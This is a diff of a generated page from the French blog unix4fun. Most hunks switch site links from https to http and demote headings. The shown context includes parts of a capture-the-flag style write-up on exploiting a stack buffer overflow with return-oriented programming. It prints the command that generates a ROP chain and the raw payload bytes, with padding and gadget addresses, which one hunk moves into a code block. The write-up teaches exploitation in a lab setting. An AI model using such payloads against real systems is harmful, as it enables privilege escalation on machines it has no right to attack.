@@ -21,13 +21,13 @@
   <!--<![endif]-->
 
   <!--[if lte IE 8]>
-  <link rel="stylesheet" href="https://unix4fun.github.io/css/side-menu-old-ie.css">
+  <link rel="stylesheet" href="http://unix4fun.github.io/css/side-menu-old-ie.css">
   <![endif]-->
   <!--[if gt IE 8]><!-->
-  <link rel="stylesheet" href="https://unix4fun.github.io/css/side-menu.css">
+  <link rel="stylesheet" href="http://unix4fun.github.io/css/side-menu.css">
   <!--<![endif]-->
 
-  <link rel="stylesheet" href="https://unix4fun.github.io/css/blackburn.css">
+  <link rel="stylesheet" href="http://unix4fun.github.io/css/blackburn.css">
 
   
   <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
@@ -44,7 +44,7 @@
   <script>hljs.initHighlightingOnLoad();</script>
   
 
-  <link rel="shortcut icon" href="https://unix4fun.github.io/img/favicon.ico" type="image/x-icon" />
+  <link rel="shortcut icon" href="http://unix4fun.github.io/img/favicon.ico" type="image/x-icon" />
 
   
   
@@ -63,7 +63,7 @@
 <div id="menu">
 
   
-  <a class="pure-menu-heading brand" href="https://unix4fun.github.io/">unix4fun</a>
+  <a class="pure-menu-heading brand" href="http://unix4fun.github.io/">unix4fun</a>
 
 
   <div class="pure-menu">
@@ -71,31 +71,31 @@
       
       
         <li class="pure-menu-item">
-          <a class="pure-menu-link" href="https://unix4fun.github.io/post/"><i class='fa fa-list fa-fw'></i>posts</a>
+          <a class="pure-menu-link" href="http://unix4fun.github.io/post/"><i class='fa fa-list fa-fw'></i>posts</a>
       
         </li>
       
       
         <li class="pure-menu-item">
-          <a class="pure-menu-link" href="https://unix4fun.github.io/tags/"><i class='fa fa-tags fa-fw'></i>tags</a>
+          <a class="pure-menu-link" href="http://unix4fun.github.io/tags/"><i class='fa fa-tags fa-fw'></i>tags</a>
       
         </li>
       
       
         <li class="pure-menu-item">
-          <a class="pure-menu-link" href="https://unix4fun.github.io/topics/"><i class='fa fa-folder fa-fw'></i>stories</a>
+          <a class="pure-menu-link" href="http://unix4fun.github.io/topics/"><i class='fa fa-folder fa-fw'></i>stories</a>
       
         </li>
       
       
         <li class="pure-menu-item">
-          <a class="pure-menu-link" href="https://unix4fun.github.io/authors/"><i class='fa fa-user fa-fw'></i>authors</a>
+          <a class="pure-menu-link" href="http://unix4fun.github.io/authors/"><i class='fa fa-user fa-fw'></i>authors</a>
       
         </li>
       
       
         <li class="pure-menu-item">
-          <a class="pure-menu-link" href="https://unix4fun.github.io/about/"><i class='fa fa-phone fa-fw'></i>About</a>
+          <a class="pure-menu-link" href="http://unix4fun.github.io/about/"><i class='fa fa-phone fa-fw'></i>About</a>
       
         </li>
       
@@ -230,21 +230,21 @@
   <div>
     <i class="fa fa-tags fa-fw"></i>
     
-      <a class="post-taxonomy-tag" href="https://unix4fun.github.io/tags/analysis">analysis</a>&nbsp;&#47;
+      <a class="post-taxonomy-tag" href="http://unix4fun.github.io/tags/analysis">analysis</a>&nbsp;&#47;
     
-      <a class="post-taxonomy-tag" href="https://unix4fun.github.io/tags/assembly">assembly</a>&nbsp;&#47;
+      <a class="post-taxonomy-tag" href="http://unix4fun.github.io/tags/assembly">assembly</a>&nbsp;&#47;
     
-      <a class="post-taxonomy-tag" href="https://unix4fun.github.io/tags/c">C</a>&nbsp;&#47;
+      <a class="post-taxonomy-tag" href="http://unix4fun.github.io/tags/c">C</a>&nbsp;&#47;
     
-      <a class="post-taxonomy-tag" href="https://unix4fun.github.io/tags/code">code</a>&nbsp;&#47;
+      <a class="post-taxonomy-tag" href="http://unix4fun.github.io/tags/code">code</a>&nbsp;&#47;
     
-      <a class="post-taxonomy-tag" href="https://unix4fun.github.io/tags/exploit">exploit</a>&nbsp;&#47;
+      <a class="post-taxonomy-tag" href="http://unix4fun.github.io/tags/exploit">exploit</a>&nbsp;&#47;
     
-      <a class="post-taxonomy-tag" href="https://unix4fun.github.io/tags/fun">fun</a>&nbsp;&#47;
+      <a class="post-taxonomy-tag" href="http://unix4fun.github.io/tags/fun">fun</a>&nbsp;&#47;
     
-      <a class="post-taxonomy-tag" href="https://unix4fun.github.io/tags/linux">linux</a>&nbsp;&#47;
+      <a class="post-taxonomy-tag" href="http://unix4fun.github.io/tags/linux">linux</a>&nbsp;&#47;
     
-      <a class="post-taxonomy-tag" href="https://unix4fun.github.io/tags/security">security</a>
+      <a class="post-taxonomy-tag" href="http://unix4fun.github.io/tags/security">security</a>
     
   </div>
   
@@ -256,7 +256,7 @@
   <div>
     <i class="fa fa-user fa-fw"></i>
     
-      <a class="post-taxonomy-author" href="https://unix4fun.github.io/authors/poz">poz</a>
+      <a class="post-taxonomy-author" href="http://unix4fun.github.io/authors/poz">poz</a>
     
   </div>
   
@@ -267,7 +267,7 @@
 
   
 
-<h1 id="introduction">Introduction</h1>
+<h2 id="introduction">Introduction</h2>
 
 <p>Bon ben dans la même veine que le post précedent, je vais tâcher d&rsquo;expliquer comment exploiter un buffer overflow sur la pile, en utilisant la méthode de Return-Oriented Programming.  Cette technique est utilise quand la pile n&rsquo;est pas exécutable, l&rsquo;idée étant de sauter dans une portion de code qui l&rsquo;est, et petit à petit, reconstruire un flot d&rsquo;exécution qui mène à&hellip; obtenir un shell avec des droits plus importants, dans le cas présent.</p>
 
@@ -350,7 +350,7 @@ $
 
 <p>Oookay, rien d&rsquo;intéressant.   Vraiment?</p>
 
-<h1 id="tentative-de-ret2libc">Tentative de ret2libc</h1>
+<h2 id="tentative-de-ret2libc">Tentative de ret2libc</h2>
 
 <p>Il y a peut-être moyen de rendre la stack exécutable grâce à <code>mprotect()</code> (<code>_dl_make_stack_executable</code> nous y a fait fortement penser), puis de sauter à l&rsquo;adresse d&rsquo;un shellcode qu&rsquo;on aurait mis dans le buffer du programme, ou dans une variable d&rsquo;environnement.</p>
 
@@ -441,7 +441,7 @@ gdb$ ni
 Bien!  Est-ce qu'on peut mettre les arguments voulus dans les registres idoines, maintenant?  Je ne vois pas comment faire, arrivé à ce stade.  C'est malin, j'aurais dû y penser plus tôt.  Ca a l'air compromis, de ne faire que du ret2libc.  Va falloir passer par du ROP.
 </code></pre>
 
-<h1 id="bon-ben-rop">Bon&hellip; ben ROP.</h1>
+<h2 id="bon-ben-rop">Bon&hellip; ben ROP.</h2>
 
 <p>L&rsquo;objectif est de trouver des séquences d&rsquo;instructions dans la zone exécutable de la mémoire du processus, afin de les emboîter petit à petit pour arriver à une succession d&rsquo;opérations qui feront quelque chose de particulier.  En l&rsquo;occurrence, obtenir un shell avec les droits privilégiés.</p>
 
@@ -550,9 +550,8 @@ if __name__ == &quot;__main__&quot;:
 ^D
 
 $ sc=$(ropchain.py 280); export sc=${sc:2:-1}; echo $sc
+    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB\x00\x00\x9f\xbdA\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x000\xec@\x00\x00\x00\x00\x00\x00&lt;I\x00\x00\x00\x00\x00\xe7\x17@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05rC\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa7\x81K\x00\x00\x00\x00\x00'\xe9J\x00\x00\x00\x00\x00
 </code></pre>
-
-<p>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB\x00\x00\x9f\xbdA\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x000\xec@\x00\x00\x00\x00\x00\x00&lt;I\x00\x00\x00\x00\x00\xe7\x17@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05rC\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa7\x81K\x00\x00\x00\x00\x00&rsquo;\xe9J\x00\x00\x00\x00\x00</p>
 
 <p>NOTE:  le <code>${sc:2:-1}</code> permet de se débarrasser du <code>b&quot;</code> en début de chaîne et <code>&quot;</code> en fin de chaîne.  Il y a sûrement moyen de faire ça intelligemment mais je suis une bille en python, et j&rsquo;avais pas de temps à perdre là-dessus!</p>
 
@@ -699,13 +698,13 @@ CeciEstMonFlagTagadaTsoinTsoin!
 <div class="prev-next-post pure-g">
   <div class="pure-u-1-24" style="text-align: left;">
     
-    <a href="https://unix4fun.github.io/post/on-est-sur-githubpages/"><i class="fa fa-chevron-left"></i></a>
+    <a href="http://unix4fun.github.io/post/on-est-sur-githubpages/"><i class="fa fa-chevron-left"></i></a>
     
   </div>
   <div class="pure-u-10-24">
     
     <nav class="prev">
-      <a href="https://unix4fun.github.io/post/on-est-sur-githubpages/">On est sur Github Pages!!! rholallalala</a>
+      <a href="http://unix4fun.github.io/post/on-est-sur-githubpages/">On est sur Github Pages!!! rholallalala</a>
     </nav>
     
   </div>
@@ -746,7 +745,7 @@ CeciEstMonFlagTagadaTsoinTsoin!
 
 </div>
 </div>
-<script src="https://unix4fun.github.io/js/ui.js"></script>
+<script src="http://unix4fun.github.io/js/ui.js"></script>
 
 
 <script>
